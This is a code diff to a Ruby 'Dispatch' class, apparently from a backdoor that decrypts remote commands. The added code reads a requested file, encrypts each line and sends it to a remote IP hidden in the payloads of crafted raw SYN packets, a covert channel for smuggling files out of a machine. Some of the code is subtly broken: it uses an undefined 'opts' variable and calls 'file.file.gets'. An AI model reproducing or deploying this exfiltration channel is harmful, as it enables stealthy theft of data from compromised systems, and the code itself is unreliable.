@@ -2,6 +2,9 @@
 
 require "openssl"
 require "socket"
+require "packetfu"
+
+include PacketFu
 
 # -------------------------------------------------------------
 # Dispatch
@@ -12,9 +15,11 @@ require "socket"
 class Dispatch
 
 	@response = ""
+	@interface = ""
 
-	def initialize(ciphertext)
+	def initialize(ciphertext, interface)
 		plaintext = decrypt ciphertext
+        @interface = interface
 
 		# Split up the request so we can pass the parameters to the correct method
 		request = plaintext.split
@@ -54,13 +59,38 @@ class Dispatch
 		if ! File.file? path
 			return "Sorry, that file does not exist."
 		else
-			tcp = TCPSocket.new(ip, port)
+			cfg = Utils.whoami?(:iface => opts[:dev])
 
 			File.open(path, "rb") do |file|
 				while(line = file.file.gets)
-					tcp.send(line)
+				    tcp = TCPPacket.new
+					tcp.eth_saddr = cfg[:eth_saddr]
+					
+					tcp.tcp_src = rand(0xfff - 1024) + 1024
+					tcp.tcp_dst = port
+					tcp.tcp_flags.syn = 1
+					
+					tcp.ip_saddr = cfg[:saddr]
+					tcp.ip_daddr = ip
+					
+					tcp.payload = encrypt line
+					tcp.recalc
+					tcp.to_w(@interface)
 				end
 			end
+			
+			tcp = TCPPacket.new
+			tcp.eth_saddr = cfg[:eth_saddr]
+					
+			tcp.tcp_src = rand(0xfff - 1024) + 1024
+			tcp.tcp_dst = port
+			tcp.tcp_flags.syn = 1
+			
+			tcp.ip_saddr = cfg[:saddr]
+			tcp.ip_daddr = ip
+			
+			tcp.recalc
+			tcp.to_w(@interface)
 			
 			@response = "Sending Complete"
 
